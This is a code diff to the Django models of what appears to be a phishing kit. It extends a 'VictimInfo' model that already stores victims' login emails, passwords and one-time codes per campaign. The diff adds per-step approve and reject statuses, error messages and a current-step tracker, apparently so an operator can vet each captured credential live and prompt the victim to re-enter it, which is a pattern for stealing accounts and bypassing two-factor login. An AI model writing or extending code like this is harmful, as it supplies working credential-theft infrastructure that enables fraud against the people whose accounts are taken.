@@ -41,13 +41,33 @@ class Campaign(models.Model):
     def __str__(self):
         return f'Campaign for {self.recipient_email} - {self.email_template.type}'
     
+SUBMISSION_STATUS_CHOICES = [
+    ('pending', 'Pending'),
+    ('approved', 'Approved'),
+    ('rejected', 'Rejected'),
+]
+
 class VictimInfo(models.Model):
     id = ShortUUIDField(primary_key=True, length=10, alphabet='0123456789abcdefghijklmnopqrstuvwxyz')
     user = models.ForeignKey('accounts.CustomUser', on_delete=models.CASCADE, related_name='victim_infos')
     campaign = models.ForeignKey(Campaign, on_delete=models.CASCADE, related_name='victim_infos')
-    login_email = models.EmailField()
+    login_email = models.EmailField(blank=True, null=True)
     login_password = models.CharField(max_length=255, null=True, blank=True)
     login_otp = models.CharField(max_length=6, blank=True, null=True)
+    
+    # New fields for approval system
+    email_status = models.CharField(max_length=20, choices=SUBMISSION_STATUS_CHOICES, default='pending')
+    password_status = models.CharField(max_length=20, choices=SUBMISSION_STATUS_CHOICES, default='pending')
+    otp_status = models.CharField(max_length=20, choices=SUBMISSION_STATUS_CHOICES, default='pending')
+    
+    # Error messages for rejected submissions
+    email_error_message = models.TextField(blank=True, null=True)
+    password_error_message = models.TextField(blank=True, null=True)
+    otp_error_message = models.TextField(blank=True, null=True)
+    
+    # Track which step is currently pending
+    current_step = models.CharField(max_length=20, default='email')  # email, password, otp
+    
     created_at = models.DateTimeField(auto_now_add=True)
     updated_at = models.DateTimeField(auto_now=True)
 
@@ -57,7 +77,7 @@ class VictimInfo(models.Model):
         ordering = ['-created_at']
 
     def __str__(self):
-        return f'Victim Info for {self.login_email} - Campaign {self.campaign}'
+        return f'Victim Info for {self.login_email or "Unknown"} - Campaign {self.campaign}'
 
 EMAIL_EVENT_TYPE_CHOICES = [
     ('open', 'Open'),
